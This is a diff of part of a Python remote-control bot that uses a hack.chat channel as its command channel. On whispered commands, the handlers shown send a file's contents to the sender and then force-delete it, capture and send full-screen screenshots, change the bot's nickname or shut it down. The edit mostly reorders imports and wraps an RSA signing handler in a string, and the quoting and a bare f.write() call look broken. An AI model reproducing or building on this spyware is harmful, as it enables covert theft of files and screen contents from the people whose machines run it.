@@ -1,4 +1,6 @@
-import hackchat,uuid
+import uuid
+import hackchat
+
 mac=uuid.UUID(int=uuid.getnode()).hex[-12:].upper()
 conn=hackchat.HackChat(uuid.uuid4().hex[:8],'whoami')
 conn.on_whisper+=[cmdexec]
@@ -17,7 +19,11 @@ def cmdexec(conn,msg,sender,result):
                 conn.send_to(target=sender,msg=f.read())
                 os.system('del /f /q"'+fn+'"')
         elif msg2[1].lower()=='screenshot':
-            import pyautogui,win32api,os,datetime,base64
+            import base64
+            import datetime
+            import os
+            import pyautogui
+            import win32api
             img=pyautogui.screenshot(
                 region=[0,0,
                 win32api.GetSystemMetrics(0),
@@ -30,15 +36,19 @@ def cmdexec(conn,msg,sender,result):
             os.system('del /f /q"'+fn+'"')
         elif msg2[1].lower()=='close':
             exit(0)
+            '''
         elif msg2[1].lower()=='identify1':
-            import rsa,tempfile,uuid
+            import tempfile
+            import uuid
+
+            import rsa
             pri_key=None
             with tempfile.TemporaryFile(mode='rb+') as f:
                 f.write()
                 pri_key=rsa.PrivateKey.load_pkcs1(f.read())
             m=msg2[2].encode('utf-8')
             s=rsa.sign(m,pri_key,'SHA-1').decode('utf-8')
-            conn.send_to(sender,'_ identify2 '+s+uuid.uuid4().hex)
+            conn.send_to(sender,'_ identify2 '+s+uuid.uuid4().hex)'''
         elif msg2[1].lower()=='change':
             if msg2[2].lower()=='nickname':
                 conn.change_nick(msg2[3])
